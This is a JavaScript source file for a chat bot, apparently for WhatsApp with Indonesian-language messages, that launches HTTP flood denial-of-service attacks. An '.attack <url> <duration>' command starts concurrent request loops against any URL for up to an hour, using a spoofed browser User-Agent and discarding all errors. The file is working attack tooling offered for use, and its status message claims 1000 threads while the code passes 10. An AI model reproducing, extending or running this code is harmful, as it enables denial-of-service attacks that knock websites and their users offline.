const axios = require('axios');

async function httpFlood(targetUrl, duration, delayMs = 100, threads = 1000) {
    console.log(`Starting HTTP flood attack on ${targetUrl} for ${duration} seconds`);
    
    const endTime = Date.now() + (duration * 1000);
    let requestCount = 0;
    
    const makeRequest = async () => {
        while (Date.now() < endTime) {
            try {
                await axios.get(targetUrl, {
                    timeout: 5000,
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36'
                    }
                });
                requestCount++;
                await new Promise(resolve => setTimeout(resolve, delayMs));
            } catch (error) {
                // Ignore errors during flood attack
            }
        }
    };
    
    const threadsArray = [];
    for (let i = 0; i < threads; i++) {
        threadsArray.push(makeRequest());
    }
    
    await Promise.all(threadsArray);
    
    console.log(`HTTP flood completed. Total requests sent: ${requestCount}`);
    return requestCount;
}

async function handleCommand(sock, sender, text, pushName) {
    const command = text.trim();
    
    if (command === '.menu' || command === '!menu') {
        const menuMessage = `
🤖 *BOT MENU* 🤖

*.menu* - Menampilkan menu ini
*.attack <url> <duration>* - HTTP Flood Attack
  Contoh: .attack https://example.com 60

⚡ *Zeiss Bot* ⚡
        `.trim();
        
        try {
            await sock.sendMessage(sender, { text: menuMessage });
            console.log('Sent menu to admin');
        } catch (error) {
            console.log('Error sending menu:', error.message);
        }
    }
    else if (command.startsWith('.attack ') || command.startsWith('!attack ')) {
        const args = command.split(' ').slice(1);
        if (args.length < 2) {
            try {
                await sock.sendMessage(sender, { 
                    text: '❌ Format salah! Gunakan: .attack <url> <duration>\nContoh: .attack https://example.com 60' 
                });
            } catch (error) {
                console.log('Error sending message:', error.message);
            }
            return;
        }
        
        const url = args[0];
        const duration = parseInt(args[1]);
        
        if (!url.startsWith('http')) {
            try {
                await sock.sendMessage(sender, { 
                    text: '❌ URL harus dimulai dengan http:// atau https://' 
                });
            } catch (error) {
                console.log('Error sending message:', error.message);
            }
            return;
        }
        
        if (isNaN(duration) || duration < 1 || duration > 3600) {
            try {
                await sock.sendMessage(sender, { 
                    text: '❌ Duration harus angka antara 1-3600 detik' 
                });
            } catch (error) {
                console.log('Error sending message:', error.message);
            }
            return;
        }
        
        try {
            await sock.sendMessage(sender, { 
                text: `⚡ Memulai HTTP Flood Attack...\n📡 Target: ${url}\n⏰ Duration: ${duration} detik\n⏳ Delay: 100ms\n🧵 Threads: 1000` 
            });
            
            const requestCount = await httpFlood(url, duration, 100, 10);
            
            await sock.sendMessage(sender, { 
                text: `✅ Attack selesai!\n📊 Total requests: ${requestCount}\n🎯 Target: ${url}\n⏰ Duration: ${duration} detik` 
            });
        } catch (error) {
            console.log('Error during attack:', error.message);
            try {
                await sock.sendMessage(sender, { 
                    text: `❌ Error selama attack: ${error.message}` 
                });
            } catch (sendError) {
                console.log('Error sending error message:', sendError.message);
            }
        }
    }
}

module.exports = { handleCommand, httpFlood };